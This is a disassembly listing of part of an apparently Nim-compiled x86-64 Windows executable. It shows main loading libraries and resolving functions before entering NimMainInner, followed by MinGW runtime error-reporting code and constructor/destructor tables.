  409fa2:	e8 c8 7e ff ff       	call   401e6f <nimGetProcAddr>
  409fa7:	48 8b 0d 62 0d 02 00 	mov    0x20d62(%rip),%rcx        # 42ad10 <TM__kNniPh4YJmm9aWyhkCQWDNg_2>
  409fae:	48 8d 15 43 25 00 00 	lea    0x2543(%rip),%rdx        # 40c4f8 <.rdata+0x4f8>
  409fb5:	48 89 05 44 0d 02 00 	mov    %rax,0x20d44(%rip)        # 42ad00 <Dl_30180001_>
  409fbc:	e8 ae 7e ff ff       	call   401e6f <nimGetProcAddr>
  409fc1:	48 8b 0d 48 0d 02 00 	mov    0x20d48(%rip),%rcx        # 42ad10 <TM__kNniPh4YJmm9aWyhkCQWDNg_2>
  409fc8:	48 8d 15 33 25 00 00 	lea    0x2533(%rip),%rdx        # 40c502 <.rdata+0x502>
  409fcf:	48 89 05 22 0d 02 00 	mov    %rax,0x20d22(%rip)        # 42acf8 <Dl_30195001_>
  409fd6:	e8 94 7e ff ff       	call   401e6f <nimGetProcAddr>
  409fdb:	48 8b 0d 2e 0d 02 00 	mov    0x20d2e(%rip),%rcx        # 42ad10 <TM__kNniPh4YJmm9aWyhkCQWDNg_2>
  409fe2:	48 8d 15 2b 25 00 00 	lea    0x252b(%rip),%rdx        # 40c514 <.rdata+0x514>
  409fe9:	48 89 05 00 0d 02 00 	mov    %rax,0x20d00(%rip)        # 42acf0 <Dl_32210001_>
  409ff0:	e8 7a 7e ff ff       	call   401e6f <nimGetProcAddr>
  409ff5:	48 8b 0d 14 0d 02 00 	mov    0x20d14(%rip),%rcx        # 42ad10 <TM__kNniPh4YJmm9aWyhkCQWDNg_2>
  409ffc:	48 8d 15 20 25 00 00 	lea    0x2520(%rip),%rdx        # 40c523 <.rdata+0x523>
  40a003:	48 89 05 de 0c 02 00 	mov    %rax,0x20cde(%rip)        # 42ace8 <Dl_30890001_>
  40a00a:	e8 60 7e ff ff       	call   401e6f <nimGetProcAddr>
  40a00f:	48 8d 0d 4a 78 00 00 	lea    0x784a(%rip),%rcx        # 411860 <TM__zjeWotTwb2UTl5yWEPxJRw_4>
  40a016:	48 89 05 c3 0c 02 00 	mov    %rax,0x20cc3(%rip)        # 42ace0 <Dl_31790001_>
  40a01d:	e8 89 79 ff ff       	call   4019ab <nimLoadLibrary>
  40a022:	48 8d 0d 17 78 00 00 	lea    0x7817(%rip),%rcx        # 411840 <TM__zjeWotTwb2UTl5yWEPxJRw_5>
  40a029:	48 85 c0             	test   %rax,%rax
  40a02c:	48 89 05 ed 0c 02 00 	mov    %rax,0x20ced(%rip)        # 42ad20 <TM__zjeWotTwb2UTl5yWEPxJRw_2>
  40a033:	0f 84 1f f1 ff ff    	je     409158 <main+0xb08>
  40a039:	48 8d 15 ef 24 00 00 	lea    0x24ef(%rip),%rdx        # 40c52f <.rdata+0x52f>
  40a040:	48 89 c1             	mov    %rax,%rcx
  40a043:	e8 27 7e ff ff       	call   401e6f <nimGetProcAddr>
  40a048:	48 8d 0d 51 78 00 00 	lea    0x7851(%rip),%rcx        # 4118a0 <TM__VwGJGy8jMvmYmrV9ckorjwQ_4>
  40a04f:	48 89 05 c2 0c 02 00 	mov    %rax,0x20cc2(%rip)        # 42ad18 <Dl_32565001_>
  40a056:	e8 50 79 ff ff       	call   4019ab <nimLoadLibrary>
  40a05b:	48 8d 0d 1e 78 00 00 	lea    0x781e(%rip),%rcx        # 411880 <TM__VwGJGy8jMvmYmrV9ckorjwQ_5>
  40a062:	48 85 c0             	test   %rax,%rax
  40a065:	48 89 05 c4 0c 02 00 	mov    %rax,0x20cc4(%rip)        # 42ad30 <TM__VwGJGy8jMvmYmrV9ckorjwQ_2>
  40a06c:	0f 84 e6 f0 ff ff    	je     409158 <main+0xb08>
  40a072:	48 8d 15 ca 24 00 00 	lea    0x24ca(%rip),%rdx        # 40c543 <.rdata+0x543>
  40a079:	48 89 c1             	mov    %rax,%rcx
  40a07c:	e8 ee 7d ff ff       	call   401e6f <nimGetProcAddr>
  40a081:	48 8d 0d 58 78 00 00 	lea    0x7858(%rip),%rcx        # 4118e0 <TM__1MaEGwTuVGZfC1TUC8yTpA_4>
  40a088:	48 89 05 99 0c 02 00 	mov    %rax,0x20c99(%rip)        # 42ad28 <Dl_32995001_>
  40a08f:	e8 17 79 ff ff       	call   4019ab <nimLoadLibrary>
  40a094:	48 8d 0d 25 78 00 00 	lea    0x7825(%rip),%rcx        # 4118c0 <TM__1MaEGwTuVGZfC1TUC8yTpA_5>
  40a09b:	48 85 c0             	test   %rax,%rax
  40a09e:	48 89 05 ab 0c 02 00 	mov    %rax,0x20cab(%rip)        # 42ad50 <TM__1MaEGwTuVGZfC1TUC8yTpA_2>
  40a0a5:	0f 84 ad f0 ff ff    	je     409158 <main+0xb08>
  40a0ab:	48 8d 15 9d 24 00 00 	lea    0x249d(%rip),%rdx        # 40c54f <.rdata+0x54f>
  40a0b2:	48 89 c1             	mov    %rax,%rcx
  40a0b5:	e8 b5 7d ff ff       	call   401e6f <nimGetProcAddr>
  40a0ba:	48 8b 0d 8f 0c 02 00 	mov    0x20c8f(%rip),%rcx        # 42ad50 <TM__1MaEGwTuVGZfC1TUC8yTpA_2>
  40a0c1:	48 8d 15 95 24 00 00 	lea    0x2495(%rip),%rdx        # 40c55d <.rdata+0x55d>
  40a0c8:	48 89 05 79 0c 02 00 	mov    %rax,0x20c79(%rip)        # 42ad48 <Dl_33470001_>
  40a0cf:	e8 9b 7d ff ff       	call   401e6f <nimGetProcAddr>
  40a0d4:	48 8b 0d 75 0c 02 00 	mov    0x20c75(%rip),%rcx        # 42ad50 <TM__1MaEGwTuVGZfC1TUC8yTpA_2>
  40a0db:	48 8d 15 8a 24 00 00 	lea    0x248a(%rip),%rdx        # 40c56c <.rdata+0x56c>
  40a0e2:	48 89 05 57 0c 02 00 	mov    %rax,0x20c57(%rip)        # 42ad40 <Dl_33565001_>
  40a0e9:	e8 81 7d ff ff       	call   401e6f <nimGetProcAddr>
  40a0ee:	48 8d 0d 2b 78 00 00 	lea    0x782b(%rip),%rcx        # 411920 <TM__FQe4XyEc6FvCCYlu9cDmHHQ_4>
  40a0f5:	48 89 05 3c 0c 02 00 	mov    %rax,0x20c3c(%rip)        # 42ad38 <Dl_33290001_>
  40a0fc:	e8 aa 78 ff ff       	call   4019ab <nimLoadLibrary>
  40a101:	48 8d 0d f8 77 00 00 	lea    0x77f8(%rip),%rcx        # 411900 <TM__FQe4XyEc6FvCCYlu9cDmHHQ_5>
  40a108:	48 85 c0             	test   %rax,%rax
  40a10b:	48 89 05 4e 0c 02 00 	mov    %rax,0x20c4e(%rip)        # 42ad60 <TM__FQe4XyEc6FvCCYlu9cDmHHQ_2>
  40a112:	0f 84 40 f0 ff ff    	je     409158 <main+0xb08>
  40a118:	48 8d 15 59 24 00 00 	lea    0x2459(%rip),%rdx        # 40c578 <.rdata+0x578>
  40a11f:	48 89 c1             	mov    %rax,%rcx
  40a122:	e8 48 7d ff ff       	call   401e6f <nimGetProcAddr>
  40a127:	48 89 05 2a 0c 02 00 	mov    %rax,0x20c2a(%rip)        # 42ad58 <Dl_61320001_>
  40a12e:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  40a133:	ff d0                	call   *%rax
  40a135:	48 8d 05 01 be ff ff 	lea    -0x41ff(%rip),%rax        # 405f3d <NimMainInner>
  40a13c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  40a141:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  40a146:	e8 8a 7b ff ff       	call   401cd5 <nimGC_setStackBottom>
  40a14b:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
  40a150:	ff d0                	call   *%rax
  40a152:	31 c0                	xor    %eax,%eax
  40a154:	48 83 c4 38          	add    $0x38,%rsp
  40a158:	5b                   	pop    %rbx
  40a159:	5e                   	pop    %rsi
  40a15a:	5f                   	pop    %rdi
  40a15b:	5d                   	pop    %rbp
  40a15c:	41 5c                	pop    %r12
  40a15e:	41 5d                	pop    %r13
  40a160:	41 5e                	pop    %r14
  40a162:	41 5f                	pop    %r15
  40a164:	c3                   	ret
  40a165:	90                   	nop
  40a166:	90                   	nop
  40a167:	90                   	nop
  40a168:	90                   	nop
  40a169:	90                   	nop
  40a16a:	90                   	nop
  40a16b:	90                   	nop
  40a16c:	90                   	nop
  40a16d:	90                   	nop
  40a16e:	90                   	nop
  40a16f:	90                   	nop

000000000040a170 <__report_error>:
  40a170:	56                   	push   %rsi
  40a171:	53                   	push   %rbx
  40a172:	48 83 ec 38          	sub    $0x38,%rsp
  40a176:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
  40a17b:	48 89 cb             	mov    %rcx,%rbx
  40a17e:	b9 02 00 00 00       	mov    $0x2,%ecx
  40a183:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
  40a188:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
  40a18d:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
  40a192:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  40a197:	e8 24 e3 ff ff       	call   4084c0 <__acrt_iob_func>
  40a19c:	41 b8 1b 00 00 00    	mov    $0x1b,%r8d
  40a1a2:	ba 01 00 00 00       	mov    $0x1,%edx
  40a1a7:	48 8d 0d d2 79 00 00 	lea    0x79d2(%rip),%rcx        # 411b80 <.rdata>
  40a1ae:	49 89 c1             	mov    %rax,%r9
  40a1b1:	e8 6a e2 ff ff       	call   408420 <fwrite>
  40a1b6:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
  40a1bb:	b9 02 00 00 00       	mov    $0x2,%ecx
  40a1c0:	e8 fb e2 ff ff       	call   4084c0 <__acrt_iob_func>
  40a1c5:	48 89 da             	mov    %rbx,%rdx
  40a1c8:	48 89 c1             	mov    %rax,%rcx
  40a1cb:	49 89 f0             	mov    %rsi,%r8
  40a1ce:	e8 15 e2 ff ff       	call   4083e8 <vfprintf>
  40a1d3:	e8 78 e2 ff ff       	call   408450 <abort>
  40a1d8:	90                   	nop
  40a1d9:	90                   	nop
  40a1da:	90                   	nop
  40a1db:	90                   	nop
  40a1dc:	90                   	nop
  40a1dd:	90                   	nop
  40a1de:	90                   	nop
  40a1df:	90                   	nop

000000000040a1e0 <register_frame_ctor>:
  40a1e0:	e9 4b 73 ff ff       	jmp    401530 <__gcc_register_frame>
  40a1e5:	90                   	nop
  40a1e6:	90                   	nop
  40a1e7:	90                   	nop
  40a1e8:	90                   	nop
  40a1e9:	90                   	nop
  40a1ea:	90                   	nop
  40a1eb:	90                   	nop
  40a1ec:	90                   	nop
  40a1ed:	90                   	nop
  40a1ee:	90                   	nop
  40a1ef:	90                   	nop

000000000040a1f0 <__CTOR_LIST__>:
  40a1f0:	ff                   	(bad)
  40a1f1:	ff                   	(bad)
  40a1f2:	ff                   	(bad)
  40a1f3:	ff                   	(bad)
  40a1f4:	ff                   	(bad)
  40a1f5:	ff                   	(bad)
  40a1f6:	ff                   	(bad)
  40a1f7:	ff                   	.byte 0xff

000000000040a1f8 <.ctors.65535>:
  40a1f8:	e0 a1                	loopne 40a19b <__report_error+0x2b>
  40a1fa:	40 00 00             	rex add %al,(%rax)
	...

000000000040a208 <__DTOR_LIST__>:
  40a208:	ff                   	(bad)
  40a209:	ff                   	(bad)
  40a20a:	ff                   	(bad)
  40a20b:	ff                   	(bad)
  40a20c:	ff                   	(bad)
  40a20d:	ff                   	(bad)
  40a20e:	ff                   	(bad)
  40a20f:	ff 00                	incl   (%rax)
  40a211:	00 00                	add    %al,(%rax)
  40a213:	00 00                	add    %al,(%rax)
  40a215:	00 00                	add    %al,(%rax)
	...
